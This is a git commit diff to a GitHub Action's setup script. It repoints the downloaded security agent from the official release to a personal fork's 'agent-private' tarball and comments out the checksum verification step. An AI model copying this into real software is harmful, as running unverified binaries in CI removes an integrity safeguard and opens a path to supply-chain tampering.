22f8441df4fb09a8fb78dca4109727edd2b7f2cb
h0x0er <jatink843@protonmail.com>
2022-12-14 15:18:54 +0530

    changes

--- src/setup.ts
+++ src/setup.ts
@@ -102,12 +102,12 @@ import {
     let auth = `token ${token}`;
 
     const downloadPath: string = await tc.downloadTool(
-      "https://github.com/step-security/agent/releases/download/v0.12.1/agent_0.12.1_linux_amd64.tar.gz",
+      "https://github.com/h0x0er/agent/releases/download/v12.0.1/agent-private_0.0.1_linux_amd64.tar.gz",
       undefined,
       auth
     );
 
-    verifyChecksum(downloadPath); // NOTE: verifying agent's checksum, before extracting
+    // verifyChecksum(downloadPath); // NOTE: verifying agent's checksum, before extracting
     const extractPath = await tc.extractTar(downloadPath);
 
     if (!confg.disable_telemetry || confg.egress_policy === "audit") {
